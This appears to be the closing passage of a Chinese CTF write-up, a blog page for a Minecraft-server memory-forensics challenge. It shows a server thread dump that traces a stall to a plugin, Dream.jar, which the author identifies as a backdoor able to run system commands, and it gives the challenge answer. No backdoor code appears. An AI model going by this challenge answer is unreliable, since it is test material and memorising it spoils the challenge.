java.base@21.0.7/java.io.BufferedInputStream.read1(BufferedInputStream.java:345)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.BufferedInputStream.implRead(BufferedInputStream.java:420)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.BufferedInputStream.read(BufferedInputStream.java:405)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/sun.nio.cs.StreamDecoder.readBytes(StreamDecoder.java:350)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:393)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/sun.nio.cs.StreamDecoder.lockedRead(StreamDecoder.java:217)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/sun.nio.cs.StreamDecoder.read(StreamDecoder.java:171)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.InputStreamReader.read(InputStreamReader.java:188)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.BufferedReader.fill(BufferedReader.java:160)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.BufferedReader.implReadLine(BufferedReader.java:370)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.BufferedReader.readLine(BufferedReader.java:347)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.io.BufferedReader.readLine(BufferedReader.java:436)<br>[03:47:53] [Watchdog Thread/ERROR]: 		Dream.jar//cloud.xzai.message.MessageEvent.onPlayerChat(MessageEvent.java:89)<br>[03:47:53] [Watchdog Thread/ERROR]: 		com.destroystokyo.paper.event.executor.asm.generated.GeneratedEventExecutor247.execute(Unknown Source)<br>[03:47:53] [Watchdog Thread/ERROR]: 		org.bukkit.plugin.EventExecutor$2.execute(EventExecutor.java:77)<br>[03:47:53] [Watchdog Thread/ERROR]: 		co.aikar.timings.TimedEventExecutor.execute(TimedEventExecutor.java:77)<br>[03:47:53] [Watchdog Thread/ERROR]: 		org.bukkit.plugin.RegisteredListener.callEvent(RegisteredListener.java:70)<br>[03:47:53] [Watchdog Thread/ERROR]: 		io.papermc.paper.plugin.manager.PaperEventManager.callEvent(PaperEventManager.java:54)<br>[03:47:53] [Watchdog Thread/ERROR]: 		io.papermc.paper.plugin.manager.PaperPluginManagerImpl.callEvent(PaperPluginManagerImpl.java:126)<br>[03:47:53] [Watchdog Thread/ERROR]: 		org.bukkit.plugin.SimplePluginManager.callEvent(SimplePluginManager.java:617)<br>[03:47:53] [Watchdog Thread/ERROR]: 		io.papermc.paper.adventure.ChatProcessor.post(ChatProcessor.java:378)<br>[03:47:53] [Watchdog Thread/ERROR]: 		io.papermc.paper.adventure.ChatProcessor$1.evaluate(ChatProcessor.java:92)<br>[03:47:53] [Watchdog Thread/ERROR]: 		io.papermc.paper.adventure.ChatProcessor$1.evaluate(ChatProcessor.java:89)<br>[03:47:53] [Watchdog Thread/ERROR]: 		org.bukkit.craftbukkit.v1_20_R3.util.Waitable.run(Waitable.java:23)<br>[03:47:53] [Watchdog Thread/ERROR]: 		net.minecraft.server.MinecraftServer.tickChildren(MinecraftServer.java:1707)<br>[03:47:53] [Watchdog Thread/ERROR]: 		net.minecraft.server.dedicated.DedicatedServer.tickChildren(DedicatedServer.java:487)<br>[03:47:53] [Watchdog Thread/ERROR]: 		net.minecraft.server.MinecraftServer.tickServer(MinecraftServer.java:1558)<br>[03:47:53] [Watchdog Thread/ERROR]: 		net.minecraft.server.MinecraftServer.runServer(MinecraftServer.java:1246)<br>[03:47:53] [Watchdog Thread/ERROR]: 		net.minecraft.server.MinecraftServer.lambda$spin$0(MinecraftServer.java:323)<br>[03:47:53] [Watchdog Thread/ERROR]: 		net.minecraft.server.MinecraftServer$$Lambda/0x00007f9c54bcc238.run(Unknown Source)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.lang.Thread.runWith(Thread.java:1596)<br>[03:47:53] [Watchdog Thread/ERROR]: 		java.base@21.0.7/java.lang.Thread.run(Thread.java:1583)<br>[03:47:53] [Watchdog Thread/ERROR]: ------------------------------<br>[03:47:53] [Watchdog Thread/ERROR]: --- DO NOT REPORT THIS TO PURPUR - THIS IS NOT A BUG OR A CRASH ---<br>[03:47:53] [Watchdog Thread/ERROR]: ------------------------------<br>[03:47:58] [Watchdog Thread/ERROR]: --- DO NOT REPORT THIS TO PURPUR - THIS IS NOT A BUG OR A CRASH  - git-Purpur-2176 (MC: 1.20.4) ---<br>[03:47:58] [Watchdog Thread/ERROR]: The server has not responded for 55 seconds! Creating thread dump<br>[03:47:58] [Watchdog Thread/ERROR]: ------------------------------<br>[03:47:58] [Watchdog Thread/ERROR]: Server thread dump (Look for plugins here before reporting to Purpur!):<br>[03:47:58] [Watchdog Thread/ERROR]: ------------------------------<br></code></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208225213712.png" srcset="/img/loading.gif" lazyload alt="image-20251208225213712"></p>
+<p>找到新上传的jar文件，发现是一个后门插件，能执行系统命令</p>
+<p><img src="../../../../img/archives/MiniVN2025/image-20251208225301014.png" srcset="/img/loading.gif" lazyload alt="image-20251208225301014"></p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Q4 Answer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Dream.jar</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="http://www.s1mh0.cn/blog/index.php/2023/12/20/linux_ncqz/">Linux内存取证 - S1mh0’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/CRONUS-Security/profile-builder">profile-builder - github.com</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/761da51/#%E5%88%B6%E4%BD%9C--profilevol2--%E7%9A%84%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B">Misc-Forensics - ⚡Lunatic BLOG⚡</a></p>
+<p><a target="_blank" rel="noopener" href="https://treasure-house.randark.site/blog/2023-10-25-MemoryForensic-Test">内存取证实验-镜像+配置文件 | Randark_JMT-陈橘墨</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="../../../../tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="../../../../tags/Misc/" class="print-no-link">#Misc</a>
+      
+        <a href="../../../../tags/%E5%87%BA%E9%A2%98/" class="print-no-link">#出题</a>
+      
+        <a href="../../../../tags/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81/" class="print-no-link">#内存取证</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mini V&amp;N CTF 2025 Misc MCServer</div>
+      <div>https://more678.github.io/2025/12/08/Mini V&amp;N CTF 2025 Misc MCServer/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>tenstrings</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="../../../08/08/2025%E6%B1%9F%E8%8B%8F%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%88%9D%E8%B5%9B/" title="江苏省第三届数据安全职业技能竞赛初赛wp">
+                        <span class="hidden-mobile">江苏省第三届数据安全职业技能竞赛初赛wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="../../../../js/events.js" ></script>
+<script  src="../../../../js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="../../../../js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="../../../../js/leancloud.js" ></script>
+
+  <script  src="../../../../js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="../../../../js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
